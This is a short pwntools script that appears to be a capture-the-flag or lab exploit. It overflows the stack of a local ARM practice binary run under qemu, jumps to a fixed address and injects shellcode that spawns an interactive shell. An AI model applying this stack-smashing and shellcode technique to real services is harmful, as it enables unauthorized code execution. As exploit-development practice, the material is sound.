# socat tcp-l:8888,fork exec:"qemu-arm -g 1234 -L . ./vuln_stacksmash_withjump"
from pwn import *

context(arch="arm")
p = remote("127.0.0.1",8888)

sc = asm(shellcraft.arm.sh())

pause()
p.send(b'a'*0x24+flat(0x10414)+sc)

p.interactive()